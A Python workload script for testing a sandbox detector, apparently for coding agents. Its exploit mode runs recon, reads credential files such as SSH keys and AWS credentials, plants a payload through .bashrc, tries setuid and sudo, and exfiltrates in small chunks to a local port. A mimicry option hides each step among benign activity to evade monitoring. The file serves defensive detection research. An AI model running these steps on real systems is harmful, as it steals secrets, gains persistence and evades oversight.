"""Agent workloads executed inside the VortexGuard sandbox (as the unprivileged user).

    python3 agent_task.py benign  SEED
    python3 agent_task.py exploit SEED [--mimicry]

Both modes start with the same benign coding-agent work (generate and parse
data, write files, byte-compile code, fetch a package index from a local
mirror). The exploit mode then runs a five-stage chain:

    recon -> credential access -> payload drop / persistence
          -> privilege escalation attempt -> low-and-slow exfiltration

Stage boundaries are printed to stderr as ``STAGE <name> <CLOCK_MONOTONIC ns>``
so the evaluation harness can measure detection delay against ground truth.
With ``--mimicry`` every malicious step is wrapped in benign file activity.
All credentials touched are decoys planted in the sandbox base image.
"""
import csv
import io
import json
import os
import random
import socket
import subprocess
import sys
import time
import py_compile


def stage(name):
    sys.stderr.write(f"STAGE {name} {time.monotonic_ns()}\n")
    sys.stderr.flush()


def benign_work(rng, rounds):
    os.makedirs("work", exist_ok=True)
    for r in range(rounds):
        rows = [[i, rng.random(), rng.choice("abcdef")] for i in range(rng.randint(200, 800))]
        buf = io.StringIO()
        csv.writer(buf).writerows(rows)
        with open(f"work/data_{r}.csv", "w") as fh:
            fh.write(buf.getvalue())
        with open(f"work/data_{r}.csv") as fh:
            total = sum(float(row[1]) for row in csv.reader(fh))
        with open(f"work/summary_{r}.json", "w") as fh:
            json.dump({"round": r, "total": total}, fh)
        src = f"work/mod_{r}.py"
        with open(src, "w") as fh:
            fh.write(f"def f(x):\n    return x * {r} + {total:.3f}\n")
        py_compile.compile(src, cfile=src + "c")
        os.listdir("work")


def fetch_index(rng):
    """Benign egress: read a package index from the local mirror (port 8080)."""
    try:
        s = socket.create_connection(("127.0.0.1", 8080), timeout=1.0)
        s.sendall(b"GET /simple/ HTTP/1.0\r\n\r\n")
        while s.recv(4096):
            pass
        s.close()
    except OSError:
        pass


def wrap(rng, mimicry, fn):
    if mimicry:
        benign_work(rng, 1)
    fn()
    if mimicry:
        benign_work(rng, 1)


def exploit(rng, mimicry):
    stage("recon")
    wrap(rng, mimicry, lambda: [subprocess.run(c, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                for c in (["id"], ["uname", "-a"], ["cat", "/etc/passwd"],
                                          ["ls", "-la", "/home"],
                                          ["find", "/usr/bin", "-maxdepth", "1", "-perm", "-4000"])])
    stage("credential_access")
    loot = []

    def steal():
        for p in (".aws/credentials", ".ssh/id_rsa", ".git-credentials", ".env"):
            try:
                with open(p) as fh:
                    loot.append(fh.read())
            except OSError:
                pass
    wrap(rng, mimicry, steal)
    stage("persistence")

    def persist():
        with open("payload.sh", "w") as fh:
            fh.write("#!/bin/sh\nwhile true; do sleep 60; done\n")
        os.chmod("payload.sh", 0o755)
        with open(".bashrc", "a") as fh:
            fh.write("\n(./payload.sh &) 2>/dev/null\n")
    wrap(rng, mimicry, persist)
    stage("privilege_escalation")

    def privesc():
        for fn in (lambda: os.setuid(0), lambda: os.setgid(0)):
            try:
                fn()
            except OSError:
                pass
        subprocess.run(["sudo", "-n", "true"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    wrap(rng, mimicry, privesc)
    stage("exfiltration")
    blob = "".join(loot).encode() or b"x" * 512
    try:
        s = socket.create_connection(("127.0.0.1", 9999), timeout=1.0)
        i = 0
        while i < len(blob):                       # low-and-slow: small chunks, jittered gaps
            n = rng.randint(32, 128)
            s.sendall(blob[i:i + n])
            i += n
            time.sleep(rng.uniform(0.02, 0.08))
            if mimicry:
                benign_work(rng, 1)
        s.close()
        sys.stderr.write("EXFIL_DONE\n")
    except OSError as e:
        sys.stderr.write(f"EXFIL_BLOCKED {e.errno}\n")
    stage("end")


def main():
    mode, seed = sys.argv[1], int(sys.argv[2])
    mimicry = "--mimicry" in sys.argv
    rng = random.Random(seed)
    stage("start")
    benign_work(rng, rng.randint(2, 4))
    if rng.random() < 0.5:
        fetch_index(rng)
    if mode == "benign":
        benign_work(rng, rng.randint(1, 3))
        fetch_index(rng)
        stage("end")
    else:
        exploit(rng, mimicry)


if __name__ == "__main__":
    main()
